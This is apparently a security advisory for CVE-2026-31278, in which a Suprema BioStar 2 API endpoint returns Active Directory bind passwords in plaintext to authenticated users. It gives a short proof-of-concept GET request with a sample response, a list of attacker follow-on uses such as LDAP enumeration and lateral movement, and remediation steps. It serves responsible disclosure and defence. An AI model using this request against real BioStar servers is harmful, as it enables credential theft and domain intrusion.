# CVE-2026-31278 Suprema BioStar 2: Active Directory Credential Exposure

---

## Metadata

| Field | Details |
|-------|---------|
| **CVE ID** | CVE-2026-31278 |
| **Vendor** | Suprema Inc. |
| **Product** | BioStar 2 |
| **Vulnerability Type** | Sensitive Information Disclosure / Credential Exposure |
| **Attack Vector** | Remote / Authenticated / Low Complexity |
| **Severity** | High |
| **Fixed In** | BioStar 2 v2.9.12 / BioStarX v1.0.2 |
| **Researcher** | Abdullah Alannaz |

---

## Summary

A sensitive information disclosure vulnerability exists in Suprema BioStar 2 due to improper handling of Active Directory integration settings. The backend API endpoint `/api/v2/setting/adserversetting` returns Active Directory bind account credentials in plaintext, despite the password being masked in the administrative UI.

---

## Affected Versions

- BioStar 2 Core / AC **v2.9.5.29**
- BioStar 2 T&A **v2.9.5.3**

---

## Technical Details

Although the password field is masked in the administrative interface, authenticated requests to the backend API disclose the full unencrypted password along with LDAP configuration parameters, including disabled SSL communication.

An authenticated attacker sends an HTTP GET request to the AD server configuration endpoint and receives the Active Directory service account password in plaintext within the server response.

### Proof of Concept

**Request:**

```http
GET /api/v2/setting/adserversetting HTTP/1.1
Host: <target>
Authorization: Bearer <token>
```

**Response:**

```json
{
  "ad_server": "ldap://internal.domain.local",
  "bind_dn": "CN=svc_biostar,DC=domain,DC=local",
  "password": "<plaintext_password_returned_here>",
  "ssl_enabled": false
}
```

---

## Impact

An authenticated attacker may leverage the disclosed credentials to:

- Perform LDAP authentication against Active Directory
- Enumerate domain users, groups, and organizational units
- Conduct internal network reconnaissance
- Perform lateral movement across domain-connected systems
- Potentially escalate privileges depending on service account permissions

---

## Timeline

CVE-2026-31278 assigned by MITRE |
Fix released BioStar 2 v2.9.12 / BioStarX v1.0.2 |

---

## Remediation

- Update to **BioStar 2 v2.9.12** or **BioStarX v1.0.2**
- Rotate all Active Directory service account credentials immediately
- Restrict API access to trusted network segments only
- Enable LDAPS (SSL) for Active Directory communication

---

## References

- Suprema Inc.: https://www.supremainc.com


---

## Credit

**Abdullah Alannaz** Security Researcher

> This vulnerability was responsibly disclosed to Suprema. The vendor confirmed the issue and coordinated with MITRE for CVE assignment.
